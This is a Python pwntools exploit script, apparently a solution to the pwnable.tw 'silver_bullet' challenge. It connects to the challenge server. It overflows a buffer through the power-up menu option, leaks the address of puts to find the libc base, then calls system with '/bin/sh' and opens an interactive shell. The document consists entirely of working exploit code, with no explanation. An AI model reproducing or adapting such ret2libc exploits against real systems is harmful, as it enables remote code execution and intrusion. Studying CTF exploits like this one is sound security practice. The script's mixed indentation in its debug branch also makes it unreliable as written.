from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./silver_bullet')
    elib=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
	p=remote('chall.pwnable.tw', 10103)
    elib=ELF("./libc_32.so.6")

def create(s):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(s)

def power_up(s):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil('bullet :')
    p.send(s)

def beat():
    p.recvuntil(':')
    p.sendline('3')


elf=ELF("./silver_bullet")
bin_sh_off = 0x158e8b
puts_addr=0x80484a8
read_got=elf.got["read"]
main_addr=elf.symbols["main"]
create('a'*47)
power_up('a')
payload = '\xff'*7+p32(puts_addr)+p32(main_addr)+p32(0x804AFDC)
power_up(payload)
#gdb.attach(p)
beat()
p.recvuntil("You win !!\n")
puts_addr = u32(p.recv(4))
print hex(puts_addr)
sys_addr=puts_addr-elib.symbols["puts"]+elib.symbols["system"]
bin_sh_addr=puts_addr-elib.symbols["puts"]+bin_sh_off
create('a'*47)
power_up('a')
payload2='\xff'*7 + p32(sys_addr) + 'a'*4 + p32(bin_sh_addr)
power_up(payload2)
beat()
p.interactive()

